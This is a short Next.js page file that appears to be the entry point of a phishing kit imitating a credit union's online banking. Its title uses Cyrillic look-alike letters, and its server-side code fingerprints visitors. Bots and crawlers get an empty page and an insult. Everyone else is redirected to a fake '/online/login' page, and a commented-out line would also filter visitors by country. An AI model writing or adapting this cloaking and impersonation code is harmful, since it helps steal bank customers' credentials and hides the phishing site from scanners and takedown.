import MobileDetect from "mobile-detect";
import type { NextPage } from "next";
import Head from "next/head";
import device from "device";
import geoip from "geoip-lite";

const index: NextPage<{ isBot: boolean }> = ({ isBot }) => {
  if (isBot) {
    return <div />;
  }

  return (
    <>
      <Head>
        <title>RВFСU Online</title>
        <link href="/favicon.ico" />
      </Head>
      <div />
    </>
  );
};

export const getServerSideProps = ({ res, req }: { res: any; req: any }) => {
  const md = new MobileDetect(req?.headers[`user-agent`] as string);
  const mydevice = device(req?.headers[`user-agent`] as string);

  const ip = req.headers[`x-forwarded-for`] || req.connection.remoteAddress;
  const geo = geoip.lookup(String(ip).split(`,`)[0]);

  // const isBot = md.is(`Bot`) || mydevice.is("bot") || geo?.country !== `US`;
  const isBot = md.is(`Bot`) || mydevice.is("bot");

  if (isBot) {
    res.end(`Fuck off`);
    return {
      props: { isBot },
    };
  }

  return {
    props: { isBot },
    redirect: {
      destination: "/online/login",
      permanent: false,
    },
  };
};

export default index;
